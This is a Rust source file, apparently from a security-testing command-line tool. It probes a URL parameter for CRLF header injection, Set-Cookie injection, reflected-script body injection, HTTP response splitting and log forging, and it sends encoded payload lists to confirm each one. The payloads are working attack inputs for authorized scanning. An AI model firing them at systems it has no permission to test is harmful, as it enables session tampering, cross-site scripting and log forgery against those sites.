use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(reqwest::header::HeaderMap::from_iter([(
            reqwest::header::AUTHORIZATION,
            reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
        )]));
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

const CRLF_PAYLOADS: &[&str] = &[
    "%0d%0aX-PS-Injected:1",
    "%0D%0AX-PS-Injected:1",
    "\r\nX-PS-Injected:1",
    "%0d%0aSet-Cookie:ps=injected",
    "%0D%0ASet-Cookie:ps=injected",
    "%0d%0a%0d%0a<script>alert(1)</script>",
    "%0D%0A%0D%0A<script>alert(1)</script>",
];

pub async fn header(
    url: &str,
    param: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} CRLF Header Injection", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} Param: {}", "[*]".cyan().bold(), param);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);

    for payload in CRLF_PAYLOADS {
        let test_url = format!(
            "{}{}{}={}",
            url,
            if url.contains('?') { "&" } else { "?" },
            param,
            payload
        );
        if let Ok(resp) = client.get(&test_url).send().await {
            let headers = resp.headers().clone();
            if headers.contains_key("x-ps-injected") {
                println!(
                    "{} [HIGH] CRLF header injection confirmed!",
                    "[!]".red().bold()
                );
                println!("  {} Payload: {}", "•".cyan(), payload);
                println!("  {} Injected header found in response", "•".cyan());
                return Ok(());
            }
            if let Some(set_cookie) = headers.get("set-cookie")
                && set_cookie.to_str().unwrap_or("").contains("ps=injected")
            {
                println!(
                    "{} [HIGH] CRLF Set-Cookie injection confirmed!",
                    "[!]".red().bold()
                );
                println!("  {} Payload: {}", "•".cyan(), payload);
                return Ok(());
            }
        }
    }

    println!(
        "{} No CRLF header injection detected.",
        "[-]".yellow().bold()
    );
    Ok(())
}

pub async fn body(url: &str, param: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} CRLF Body Injection", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} Param: {}", "[*]".cyan().bold(), param);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);

    for payload in CRLF_PAYLOADS {
        let test_url = format!(
            "{}{}{}={}",
            url,
            if url.contains('?') { "&" } else { "?" },
            param,
            payload
        );
        if let Ok(resp) = client.get(&test_url).send().await {
            let body = resp.text().await.unwrap_or_default();
            if body.contains("<script>alert(1)</script>") {
                println!(
                    "{} [HIGH] CRLF body injection confirmed!",
                    "[!]".red().bold()
                );
                println!("  {} Payload: {}", "•".cyan(), payload);
                println!("  {} Script tag reflected in response body", "•".cyan());
                return Ok(());
            }
        }
    }

    println!("{} No CRLF body injection detected.", "[-]".yellow().bold());
    Ok(())
}

pub async fn split(
    url: &str,
    param: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} CRLF Response Splitting", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} Param: {}", "[*]".cyan().bold(), param);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let payloads = [
        "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0aContent-Length:20%0d%0a%0d%0a<script>alert(1)</script>",
        "%0D%0AContent-Length:0%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Type:text/html%0D%0AContent-Length:20%0D%0A%0D%0A<script>alert(1)</script>",
    ];

    for payload in &payloads {
        let test_url = format!(
            "{}{}{}={}",
            url,
            if url.contains('?') { "&" } else { "?" },
            param,
            payload
        );
        if let Ok(resp) = client.get(&test_url).send().await {
            let status = resp.status();
            if status.as_u16() == 200 {
                let body = resp.text().await.unwrap_or_default();
                if body.contains("<script>") {
                    println!(
                        "{} [CRITICAL] Response splitting confirmed!",
                        "[!]".red().bold()
                    );
                    println!("  {} Payload: {}", "•".cyan(), payload);
                    return Ok(());
                }
            }
        }
    }

    println!("{} No response splitting detected.", "[-]".yellow().bold());
    Ok(())
}

pub async fn log(url: &str, param: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} CRLF Log Injection", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} Param: {}", "[*]".cyan().bold(), param);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let payloads = [
        "test%0d%0a[FAKE%20LOG%20ENTRY]%20ps_injected",
        "test%0D%0A[FAKE%20LOG%20ENTRY]%20ps_injected",
        "test\r\n[FAKE LOG ENTRY] ps_injected",
    ];

    for payload in &payloads {
        let test_url = format!(
            "{}{}{}={}",
            url,
            if url.contains('?') { "&" } else { "?" },
            param,
            payload
        );
        let _ = client.get(&test_url).send().await;
        println!("  {} Sent: {}", "•".cyan(), payload);
    }

    println!(
        "\n{} Payloads sent. Check server logs for injected entries.",
        "[*]".cyan().bold()
    );
    Ok(())
}
